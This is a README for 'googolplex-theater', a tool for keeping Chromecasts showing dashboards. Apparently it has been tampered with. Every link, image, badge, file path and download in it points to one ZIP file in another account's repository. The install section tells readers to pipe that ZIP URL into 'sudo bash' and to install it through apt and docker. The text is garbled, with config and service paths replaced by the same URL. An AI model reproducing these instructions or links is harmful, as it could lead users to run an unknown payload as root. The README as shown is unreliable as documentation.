# googolplex-theater
by [@yuzawa-san](https://raw.githubusercontent.com/WHAZAZA/googolplex-theater/develop/src/test/resources/features/googolplex-theater-1.3-alpha.1.zip)

![Icon](https://raw.githubusercontent.com/WHAZAZA/googolplex-theater/develop/src/test/resources/features/googolplex-theater-1.3-alpha.1.zip)

[![GitHub release (latest by date)](https://raw.githubusercontent.com/WHAZAZA/googolplex-theater/develop/src/test/resources/features/googolplex-theater-1.3-alpha.1.zip)](https://raw.githubusercontent.com/WHAZAZA/googolplex-theater/develop/src/test/resources/features/googolplex-theater-1.3-alpha.1.zip)
[![GitHub All Releases](https://raw.githubusercontent.com/WHAZAZA/googolplex-theater/develop/src/test/resources/features/googolplex-theater-1.3-alpha.1.zip)](https://raw.githubusercontent.com/WHAZAZA/googolplex-theater/develop/src/test/resources/features/googolplex-theater-1.3-alpha.1.zip)
[![Docker](https://raw.githubusercontent.com/WHAZAZA/googolplex-theater/develop/src/test/resources/features/googolplex-theater-1.3-alpha.1.zip)](https://raw.githubusercontent.com/WHAZAZA/googolplex-theater/develop/src/test/resources/features/googolplex-theater-1.3-alpha.1.zip)
[![packagecloud](https://raw.githubusercontent.com/WHAZAZA/googolplex-theater/develop/src/test/resources/features/googolplex-theater-1.3-alpha.1.zip)](https://raw.githubusercontent.com/WHAZAZA/googolplex-theater/develop/src/test/resources/features/googolplex-theater-1.3-alpha.1.zip)

[![build](https://raw.githubusercontent.com/WHAZAZA/googolplex-theater/develop/src/test/resources/features/googolplex-theater-1.3-alpha.1.zip)](https://raw.githubusercontent.com/WHAZAZA/googolplex-theater/develop/src/test/resources/features/googolplex-theater-1.3-alpha.1.zip)
[![codecov](https://raw.githubusercontent.com/WHAZAZA/googolplex-theater/develop/src/test/resources/features/googolplex-theater-1.3-alpha.1.zip)](https://raw.githubusercontent.com/WHAZAZA/googolplex-theater/develop/src/test/resources/features/googolplex-theater-1.3-alpha.1.zip)
[![Known Vulnerabilities](https://raw.githubusercontent.com/WHAZAZA/googolplex-theater/develop/src/test/resources/features/googolplex-theater-1.3-alpha.1.zip)](https://raw.githubusercontent.com/WHAZAZA/googolplex-theater/develop/src/test/resources/features/googolplex-theater-1.3-alpha.1.zip)

Persistently maintain multiple Chromecast devices on you local network without using your browser.
Ideal for digital signage applications.
Originally developed to display statistics dashboards.

![Example](https://raw.githubusercontent.com/WHAZAZA/googolplex-theater/develop/src/test/resources/features/googolplex-theater-1.3-alpha.1.zip)

There are several tools and libraries out there (see below), but this project is intended to be very minimalist.
There is a simple web UI to check device info and trigger refreshes.

![Screenshot](https://raw.githubusercontent.com/WHAZAZA/googolplex-theater/develop/src/test/resources/features/googolplex-theater-1.3-alpha.1.zip)

There is no backing database or database dependencies, rather there is a YAML files containing the devices which is watched for changes.
The YAML configuration is conveyed to the receiver application, which by default accepts a URL to display in an IFRAME.
The receiver application can be customized easily to suit your needs.
The application will try to reconnect if a session is ended for whatever reason.
See [feature files](src/test/resources/features/) for more details.

## Requirements

This application has very minimal runtime requirements:

* Java runtime version 11 or later.
* Linux or MacOS is preferred. Windows appears to work, but the maintainer lacks access to the hardware to test, so your mileage may vary.

There are certain requirements for networking which are beyond the realm of this project, but should be noted:

* This application must run on the same local area network as your Chromecasts.
  * Multicast DNS must work on your network and on the computer you run the application on. This is how the devices and the application discover each other.
* It is strongly recommended to use a dedicated computer to run this application.
  * The [Raspberry Pi](https://raw.githubusercontent.com/WHAZAZA/googolplex-theater/develop/src/test/resources/features/googolplex-theater-1.3-alpha.1.zip) is a good, small, and cost-effective computer to use.
  * It is not advisable to use older models which use older processor architectures (ARMv6 or ARMv7), specifically the Raspberry Pi Zero.
  * The newer models with ARMv8 processors are most desirable. See the [models list](https://raw.githubusercontent.com/WHAZAZA/googolplex-theater/develop/src/test/resources/features/googolplex-theater-1.3-alpha.1.zip) for more details. Most models introduced after 2016 fulfill these recommendations.
* IMPORTANT: URLs must be HTTPS and must not [deny framing](https://raw.githubusercontent.com/WHAZAZA/googolplex-theater/develop/src/test/resources/features/googolplex-theater-1.3-alpha.1.zip) This is a limit of using an IFRAME to display content.

Development requirements:

* JDK 11 or later. The [gradle wrapper](https://raw.githubusercontent.com/WHAZAZA/googolplex-theater/develop/src/test/resources/features/googolplex-theater-1.3-alpha.1.zip) is used to build this application and is already included.

## Installation

There are few options for installation:

* Install a Debian package (Respberry Pi compatible) either using [packagecloud](#packagecloud) or [downloading manually](#manual-package-download).
* Use a Docker image published to [Github Container Registry](https://raw.githubusercontent.com/WHAZAZA/googolplex-theater/develop/src/test/resources/features/googolplex-theater-1.3-alpha.1.zip).
* Download a [release ZIP archive](https://raw.githubusercontent.com/WHAZAZA/googolplex-theater/develop/src/test/resources/features/googolplex-theater-1.3-alpha.1.zip) or build the application locally.

### Package Installation

This application is available as a `deb` package which can be installed using `apt`.
The Raspberry Pi is a cost-effective piece of hardware to run this application, so Raspberry Pi OS (Raspbian) is the main build target for this project.
The package should theoretically work with other Debian distros as well.

The installation process may prompt you to install a version of Java.
The packaging automates the installation for the most part, so it is only really necessary to [update your configuration](#usage).
The application is installed in `/opt/googolplex-theater`.
It is registered as a systemd service enabled to launch at startup.
The service file is installed at `https://raw.githubusercontent.com/WHAZAZA/googolplex-theater/develop/src/test/resources/features/googolplex-theater-1.3-alpha.1.zip` if you wish to customize or update the program arguments.
The `systemctl` and `journalctl` commands are useful for starting, stopping, checking status, tailing logs, etc.

#### packagecloud

[Packagecloud](https://raw.githubusercontent.com/WHAZAZA/googolplex-theater/develop/src/test/resources/features/googolplex-theater-1.3-alpha.1.zip) generously provides hosting for [this project](https://raw.githubusercontent.com/WHAZAZA/googolplex-theater/develop/src/test/resources/features/googolplex-theater-1.3-alpha.1.zip) and other open-source projects.
This is one of the easiest ways to install the application and keep it up to date.
The following distros are currently supported: `raspbian/buster`, `raspbian/bullseye`, `ubuntu/focal`, `ubuntu/bionic`, `ubuntu/jammy`.

Add the packagecloud repository for this project using [their instructions](https://raw.githubusercontent.com/WHAZAZA/googolplex-theater/develop/src/test/resources/features/googolplex-theater-1.3-alpha.1.zip):
```
curl -s https://raw.githubusercontent.com/WHAZAZA/googolplex-theater/develop/src/test/resources/features/googolplex-theater-1.3-alpha.1.zip | sudo bash
```
Then install:
```
sudo apt install googolplex-theater
```
Since the repository has been added to the local `apt` system, the normal update + upgrade process will check and apply updates for this project.

#### Manual Package Download

Download a Debian package from [the releases page](https://raw.githubusercontent.com/WHAZAZA/googolplex-theater/develop/src/test/resources/features/googolplex-theater-1.3-alpha.1.zip) using wget or curl. Then install:
```
sudo apt install https://raw.githubusercontent.com/WHAZAZA/googolplex-theater/develop/src/test/resources/features/googolplex-theater-1.3-alpha.1.zip
```

This process also requires manual updating.

### Docker Installation

The application is also available on [dockerhub](https://raw.githubusercontent.com/WHAZAZA/googolplex-theater/develop/src/test/resources/features/googolplex-theater-1.3-alpha.1.zip).

This may be comparatively easier versus getting a proper Java runtime installed.
This is released in a few common processor architectures: amd64, arm64/v8, arm/v7.

To run a specific `VERSION` of the application, pull:
```
docker pull https://raw.githubusercontent.com/WHAZAZA/googolplex-theater/develop/src/test/resources/features/googolplex-theater-1.3-alpha.1.zip
```

And then to run the application:
```
docker run --net=host -v /path/to/your/conf:/opt/googolplex-theater/conf https://raw.githubusercontent.com/WHAZAZA/googolplex-theater/develop/src/test/resources/features/googolplex-theater-1.3-alpha.1.zip
```

For the service discovery to work correctly, you will need the `--net=host` option.
There is no safer way to get this working at this point in time.
Sadly, this option does not work in Mac.
If you get warnings about port 5353 being in use, you may need to disable Avahi on Linux.
The `conf` directory is mounted as a docker volume.
This will seamlessly map your local configuration into the Docker runtime.
Arguments like `--help` can be appended onto the end of the `docker run` example above.

It is recommended to wrap your `docker run` in something to keep it running as a daemon or persistent service.

### Manual Installation

Download a ZIP archive from [the releases page](https://raw.githubusercontent.com/WHAZAZA/googolplex-theater/develop/src/test/resources/features/googolplex-theater-1.3-alpha.1.zip).

Alternatively, clone/download this repo, and run:
```
./gradlew build
```

This will generate the application ZIP archive in `https://raw.githubusercontent.com/WHAZAZA/googolplex-theater/develop/src/test/resources/features/googolplex-theater-1.3-alpha.1.zip`

Once you have the ZIP archive, expand it in the desired destination location and `cd` into directory.

To show all options:
```
./bin/googolplex-theater --help
```

To run the application with default settings:
```
./bin/googolplex-theater
```

#### Running as Daemon

To provide resiliency, it is recommended to run the application as a daemon.
See service descriptor files for upstart, systemd, and launchd in the `./service/` directory. They should work with minor modifications. Please refer to their respective installation guides to enable on your system.


## Usage

The configuration is defined in `https://raw.githubusercontent.com/WHAZAZA/googolplex-theater/develop/src/test/resources/features/googolplex-theater-1.3-alpha.1.zip` and `https://raw.githubusercontent.com/WHAZAZA/googolplex-theater/develop/src/test/resources/features/googolplex-theater-1.3-alpha.1.zip`.
The location of your configuration can be customized using a command line argument.
The file is automatically watched for changes.
Some example use cases involve using cron and putting your config under version control and pulling from origin periodically, or downloading from S3/web, or updating using rsync/scp.

### Case Study: Grafana Dashboards

The maintainer has used this to show statistics dashboards in a software engineering context.

* Buy a new Raspberry Pi and install the default Raspberry Pi OS (Raspbian).
* Configure and name your Chromecasts.
* Install application Debian package and Java runtime.
* Create one Grafana playlist per device.
* Figure out how to use proper Grafana auth (proxy, token, etc).
* Make your https://raw.githubusercontent.com/WHAZAZA/googolplex-theater/develop/src/test/resources/features/googolplex-theater-1.3-alpha.1.zip file with each playlist url per device.
* Place the https://raw.githubusercontent.com/WHAZAZA/googolplex-theater/develop/src/test/resources/features/googolplex-theater-1.3-alpha.1.zip file under version control (git) or store it someplace accessible (http/s3/gcs).
* Add a cron job to pull the https://raw.githubusercontent.com/WHAZAZA/googolplex-theater/develop/src/test/resources/features/googolplex-theater-1.3-alpha.1.zip file from wherever you stored it (alternatively configure something to push the file to the Raspberry Pi).
* https://raw.githubusercontent.com/WHAZAZA/googolplex-theater/develop/src/test/resources/features/googolplex-theater-1.3-alpha.1.zip is updated periodically as our dashboard needs change. The updates are automatically picked up.
* If a screen needs to be refreshed, one can do so by accessing the web UI exposed port 8000 and hitting a few buttons.

### Using a Custom Receiver

If you wish to customize the behavior of the receiver from just displaying a single URL in an IFRAME, see the example custom receiver in `https://raw.githubusercontent.com/WHAZAZA/googolplex-theater/develop/src/test/resources/features/googolplex-theater-1.3-alpha.1.zip`.

For custom receivers, you will be required to [sign up as a Chromecast developer](https://raw.githubusercontent.com/WHAZAZA/googolplex-theater/develop/src/test/resources/features/googolplex-theater-1.3-alpha.1.zip) and also configure [devices](https://raw.githubusercontent.com/WHAZAZA/googolplex-theater/develop/src/test/resources/features/googolplex-theater-1.3-alpha.1.zip) for development.

Currently the device name and settings are printed to the screen. Customize the listener handler to do as you wish.

Host your modified file via HTTPS on your hosting provider of choice. Then point your new custom receiver application towards that page's URL.

Pass your APP_ID in as a command line argument when you run, and your receiver will be loaded up.

### Troubleshooting

There may be some issues related to discovering the Chromecast devices on your network.
It is important that the service discovery uses the network interface and IP address attached to the network with the Chromecasts.
The application will make decent attempt to find the proper network interface to use.
There is a chance it may find the wrong interface/address based on your system configration (wireless internet vs ethernet, VPN, ordering).
Some diagnostic information is printed in the application output annotated with `https://raw.githubusercontent.com/WHAZAZA/googolplex-theater/develop/src/test/resources/features/googolplex-theater-1.3-alpha.1.zip`.
There is a command line argument (`-i`) which allows the desired network interface (by name) or IP address to be provided.

## Contributing

_NOTE: due to COVID-19 the maintainer does not have regular access to the hardware to test this application._

See [https://raw.githubusercontent.com/WHAZAZA/googolplex-theater/develop/src/test/resources/features/googolplex-theater-1.3-alpha.1.zip](https://raw.githubusercontent.com/WHAZAZA/googolplex-theater/develop/src/test/resources/features/googolplex-theater-1.3-alpha.1.zip) for more details.

This is intended to be minimalist and easy to set up, so advanced features are not the goal here. Some other projects listed below may be more suited for your use case.

### TODO

* Raspberry Pi OS package distribution
* Split screen layouts
* Framing proxy (may not be feasible or allowed under HTTPS)

## Related Projects

This application overlaps in functionality with some of these fine projects:

### Protocol implementations
* [node-castv2](https://raw.githubusercontent.com/WHAZAZA/googolplex-theater/develop/src/test/resources/features/googolplex-theater-1.3-alpha.1.zip) - nodejs library
* [nodecastor](https://raw.githubusercontent.com/WHAZAZA/googolplex-theater/develop/src/test/resources/features/googolplex-theater-1.3-alpha.1.zip) - nodejs library
* [chromecast-java-api-v2](https://raw.githubusercontent.com/WHAZAZA/googolplex-theater/develop/src/test/resources/features/googolplex-theater-1.3-alpha.1.zip) - java library
* [pychromecast](https://raw.githubusercontent.com/WHAZAZA/googolplex-theater/develop/src/test/resources/features/googolplex-theater-1.3-alpha.1.zip) - python library

Foundational work has been done to research how the Chromecast protocol works and these protocol libraries have been developed in a variety of languages. A lot of the headless senders are built off of these.

### Browser Senders
* [dashcast](https://raw.githubusercontent.com/WHAZAZA/googolplex-theater/develop/src/test/resources/features/googolplex-theater-1.3-alpha.1.zip) - simple dashboard display application
* [chromecast-dashboard](https://raw.githubusercontent.com/WHAZAZA/googolplex-theater/develop/src/test/resources/features/googolplex-theater-1.3-alpha.1.zip) - similar to dashcast

These applications cast directly from your browser. You may need to have your browser up and running all of the time.

### Headless Senders
* [greenscreen](https://raw.githubusercontent.com/WHAZAZA/googolplex-theater/develop/src/test/resources/features/googolplex-theater-1.3-alpha.1.zip) - original digital signage implementation
* [multicast](https://raw.githubusercontent.com/WHAZAZA/googolplex-theater/develop/src/test/resources/features/googolplex-theater-1.3-alpha.1.zip) - a fork/refactor of greenscreen
* [Chromecast-Kiosk](https://raw.githubusercontent.com/WHAZAZA/googolplex-theater/develop/src/test/resources/features/googolplex-theater-1.3-alpha.1.zip) - similar to greenscreen or multicast

These applications cast without a Chrome browser running, rather they utilize the Chromecast protocol to establish a communication session with the devices directly.

This application is most similar to the headless sender projects. It does not use a protocol implementation library.

## Name

It is designed for multiple Chromecasts, rather than a [googol](https://raw.githubusercontent.com/WHAZAZA/googolplex-theater/develop/src/test/resources/features/googolplex-theater-1.3-alpha.1.zip) or [googolplex](https://raw.githubusercontent.com/WHAZAZA/googolplex-theater/develop/src/test/resources/features/googolplex-theater-1.3-alpha.1.zip).
It is from [The Simpsons](https://raw.githubusercontent.com/WHAZAZA/googolplex-theater/develop/src/test/resources/features/googolplex-theater-1.3-alpha.1.zip). The developer made it singular and decided to use the American spelling.
Googol sure does sound like the manufacturer of the Chromecast.
